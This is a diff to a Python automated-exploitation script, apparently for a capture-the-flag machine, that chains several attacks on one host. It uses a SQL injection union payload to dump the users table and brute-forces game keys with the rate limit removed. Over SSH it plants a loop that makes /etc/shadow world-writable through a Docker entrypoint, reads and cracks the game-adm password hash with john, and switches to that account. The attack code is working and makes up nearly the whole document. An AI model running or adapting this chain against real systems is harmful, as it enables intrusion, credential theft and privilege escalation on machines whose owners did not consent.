@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 import pexpect
+import paramiko
 import requests
 import time
 from pwn import *
@@ -9,10 +10,7 @@ import json
 from itertools import product
 import multiprocessing
 
-
-
 requests.packages.urllib3.disable_warnings()
-
 
 # Variables Globales
 name = "pr1ngl3s"
@@ -90,7 +88,7 @@ def try_keys(keys):
 
 		r = s.post(key_verify_url, verify=False, data=data_post)
 
-		time.sleep(1)
+#		time.sleep(1)
 
 		if "Game-key is invalid!" not in r.text:
 			break
@@ -294,6 +292,21 @@ def Get_Credentials():
 
 
 def Drew(username,password):
+	client = paramiko.SSHClient()
+
+	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+	client.connect('10.10.11.110', username=username, password=password)
+
+	client.exec_command("while true; do echo 'chmod 777 /etc/shadow' > /opt/docker-entrypoint.d/test; chmod +x /opt/docker-entrypoint.d/test; sleep 1;done")
+
+	sleep(10)
+
+	client.close()
+
+
+
+def Game_Tester(username,password):
 	ssh_command = f"ssh {username}@10.10.11.110 -D 1080"
 
 	ssh_session = pexpect.spawn(ssh_command, timeout=None)
@@ -302,11 +315,61 @@ def Drew(username,password):
 
 	ssh_session.sendline(password)
 
-	ssh_session.sendline("export TERM=xterm")
+	ssh_session.sendline("ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || exit")
 
-	ssh_session.sendline("cat user.txt")
+#	ssh_session.sendline("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || exit")
 
-#	ssh_session.interact()
+	ssh_session.interact()
+
+def Game_Tester2(username,password):
+	client = paramiko.SSHClient()
+	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+	client.connect('10.10.11.110', username=username, password=password)
+
+#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || touch pene || exit")
+
+	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.3 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
+
+#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
+
+def Get_Hash_Adm(username,password):
+
+	client = paramiko.SSHClient()
+	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+	client.connect('10.10.11.110', username=username, password=password)
+
+#	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
+
+	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@172.19.0.3 "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
+
+	Hash_Adm = stdout.read().decode('utf-8')
+
+	with open('hash_adm', 'w') as f:
+            f.write(Hash_Adm)
+
+	client.close()
+
+
+def GetID_RSA(username,password, username_adm, password_adm):
+	ssh_command = f"ssh {username}@10.10.11.110"
+
+	ssh_session = pexpect.spawn(ssh_command, timeout=None)
+
+	ssh_session.expect('password:')
+
+	ssh_session.sendline(password)
+
+	ssh_session.sendline("su game-tester")
+
+	ssh_session.expect('password:')
+
+	ssh_session.sendline(password_adm)
+
+#	ssh_session.sendline("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || exit")
+
+	ssh_session.interact()
 
 
 
@@ -317,9 +380,9 @@ if __name__ == "__main__":
 
 	Login()
 
-	Update_name("') union select name,email,password from users-- -","') union select name,email,password from users-- -")
+	Update_name("pr1ngl3s","') union select name,email,password from users-- -")
 
-#	Key_Gen()
+	Key_Gen()
 
 	pass_admin = GetPassAdmin()
 
@@ -339,5 +402,28 @@ if __name__ == "__main__":
 
 	User_drew, Pass_drew = Get_Credentials()
 
-	Drew(User_drew, Pass_drew)
+	multiprocessing.Process(args=(User_drew,Pass_drew,),target=Drew).start()
+
+#	multiprocessing.Process(args=(User_drew,Pass_drew,),target=Game_Tester).start()
+
+#	Game_Tester(User_drew, Pass_drew)
+
+#	Game_Tester2(User_drew, Pass_drew)
+
+#	time.sleep(5)
+
+	Get_Hash_Adm(User_drew, Pass_drew)
+
+	os.system("john -w=/usr/share/wordlists/rockyou.txt hash_adm > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")
+
+	with open('pass', 'r') as file:
+		Pass_Adm = file.read()
+
+	print(Pass_Adm)
+
+#	os.remove("hash_adm")
+
+#	os.remove("pass")
+
+	GetID_RSA(User_drew, Pass_drew, "game-adm", Pass_Adm)
 
